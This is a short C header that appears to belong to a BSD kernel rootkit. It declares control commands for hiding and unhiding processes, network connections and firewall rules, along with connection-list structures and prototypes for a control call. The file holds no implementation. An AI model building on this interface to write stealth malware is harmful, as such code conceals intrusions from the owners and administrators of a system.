
#ifndef _CONTROL_H
#define _CONTROL_H

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>

enum { 
    MOD_ENTER,
    MOD_LEAVE,
    MOD_PROC_HIDE,
    MOD_PROC_UNHIDE,
    MOD_NET_HIDE,
    MOD_NET_UNHIDE,
    MOD_NET_VIEW,
    MOD_ACTIVATE,
    MOD_DEACTIVATE,
    MOD_HIDE_FW,
    MOD_UNHIDE_FW
};
    
struct connection {
        u_int32_t l_ip;
        u_short l_port;
        u_int32_t r_ip;
        u_short r_port;
};

struct list_conn {
    struct connection conn;
    LIST_ENTRY(list_conn) list;
};

struct cy_ctl_args {
	int	cmd;
        void    *data;
};

int control_init(void);

int cy_ctl(struct proc *, struct cy_ctl_args *);
int foobar(struct proc *, struct cy_ctl_args *);

#endif /* _CONTROL_H */
